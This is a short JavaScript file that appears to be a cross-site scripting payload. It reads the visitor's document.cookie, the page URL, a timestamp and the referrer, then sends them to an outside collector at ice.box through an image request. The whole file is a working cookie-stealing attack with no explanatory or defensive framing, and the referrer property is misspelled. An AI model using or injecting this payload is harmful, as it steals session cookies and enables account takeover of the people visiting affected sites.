var d = new Date();
var time = d.getFullYear() + "-" +(d.getMonth()+1) + "-" + d.getDate() + " " + d.getHours() + ":" + d.getMinutes() + ":" + d.getSeconds();

(new Image()).src = 'http://ice.box/plug/xss/?xss=' + escape(document.cookie) + "__URL:" + escape(document.URL) + "__time:" + escape(time) + "__referer:" + escape(document.referer);
